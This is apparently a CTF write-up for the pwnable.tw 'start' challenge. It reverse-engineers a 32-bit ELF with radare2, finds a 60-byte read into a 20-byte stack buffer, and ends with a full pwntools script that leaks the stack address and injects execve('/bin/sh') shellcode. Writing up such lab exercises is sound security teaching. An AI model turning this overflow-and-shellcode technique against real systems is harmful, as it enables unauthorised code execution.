# start

file:

```
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

checksec:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8 Symbols     No        0               0       start
```

## solution

The program prompts for some input in stdin and does nothing.

Lets open the binary up in r2. There is only one function, `entry0()`.

```
[0x08048060]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[0x08048060]> afl
0x08048060    1 61           entry0
[0x08048060]> pdf @ entry0
┌ 61: entry0 ();
│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text
│           0x08048061      689d800408     push loc._exit              ; 0x804809d ;
│           0x08048066      31c0           xor eax, eax
│           0x08048068      31db           xor ebx, ebx
│           0x0804806a      31c9           xor ecx, ecx
│           0x0804806c      31d2           xor edx, edx
│           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
│           0x08048073      6874686520     push 0x20656874             ; 'the '
│           0x08048078      6861727420     push 0x20747261             ; 'art '
│           0x0804807d      6873207374     push 0x74732073             ; 's st'
│           0x08048082      684c657427     push 0x2774654c             ; 'Let''
│           0x08048087      89e1           mov ecx, esp
│           0x08048089      b214           mov dl, 0x14                ; 20
│           0x0804808b      b301           mov bl, 1
│           0x0804808d      b004           mov al, 4
│           0x0804808f      cd80           int 0x80
│           0x08048091      31db           xor ebx, ebx
│           0x08048093      b23c           mov dl, 0x3c                ; '<' ; 60
│           0x08048095      b003           mov al, 3
│           0x08048097      cd80           int 0x80
│           0x08048099      83c414         add esp, 0x14
└           0x0804809c      c3             ret
```

There are a few things to note:


* The `int 0x80` is an interrupt used for syscalls.
* `al` is the lowest byte of the `eax` register.
* `bl` is the lowest byte of the `ebx` register.
* `dl` is the lowest byte of the `edx` register.

looking at the linux 32-bit syscall table [here](https://syscalls32.paolostivanin.com/), there are two syscalls used in `start`:

* `sys_write`: `eax` = 0x04 with `mov al, 4` with `ebx` = 0x01 (stdout)
* `sys_read`: `eax` = 0x03 with `mov al, 3` with `ebx` = 0x00 (stdin)

for these two syscalls, `eax` defines which syscall, `ebx` is the fd, `ecx` is a `*buf`, and `edx` is the read count.

The program first [writes](https://man7.org/linux/man-pages/man2/write.2.html) to the fd (stdout) from the buffer with up to `0x14` (20) bytes. It later [reads](https://man7.org/linux/man-pages/man2/read.2.html) up to `0x3c` (60) bytes from the fd (stdin) to the buffer. Problematically, the buffer is only 20 bytes in size so this is a classic buffer overflow.

To find/confirm the offset, use ragg2 to generate a fuzzing payload and use r2 to debug

```bash
$ ragg2 -P 100 -r > fuzzing.txt; echo '#!/usr/bin/rarun2\nstdin=./fuzzing.txt' > profile.rr2
$ r2 -de dbg.profile=profile.rr2 start                                                  
[0x08048060]> dc
Let's start the CTF:[+] SIGNAL 11 errno=0 addr=0x41414841 code=1 si_pid=1094797377 ret=0
[0x41414841]> pxq 4@eip
0x41414841  0x00000000ffffffff
[0x41414841]> wopO 0x41414841
20
```

Basically the program crashed with a segfault as the instruction pointer is an invalid address, in this case `0x41414841`. As the fuzzing payload was a [de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) we can easily find the offset required to infringe upon the eip: 20. This is where we want to inject the payload.

Given this is a simple buffer overflow and there aren't any win functions, we will need to craft some shellcode to spawn a shell so we can `cat /home/start/flag`. To execute this, we need to put the shellcode into where the stack pointer is on the stack.

We can jump back to `0x08048087` we can print the value of the `esp` register to stdout.

```py
mov_addr = 0x8048087

stage_1 = b"A"*0x14 + p32(mov_addr)

p.recvuntil(b":")
p.send(stage_1)
leaked_addr = u32(p.recv()[:4])
```

We also need to add 0x14 to the `esp` since the leaked stack pointer doesn't exactly point to the stack, but its 20 bytes behind.

The final solve script with shellcode:


```py
#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10000)
    else:
        p = elf.process()

context(os="linux", arch="i386")
context.binary = elf = ELF("./start")
start()

mov_addr = 0x8048087

stage_1 = b"A"*0x14 + p32(mov_addr) 

p.recvuntil(b":")
p.send(stage_1)
leaked_addr = u32(p.recv()[:4])
log.info(f"leaked address: {hex(leaked_addr)}")

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
    ]))

stage_2 = b"A"*0x14 + p32(leaked_addr + 0x14) + shellcode
p.send(stage_2)
p.interactive()
```
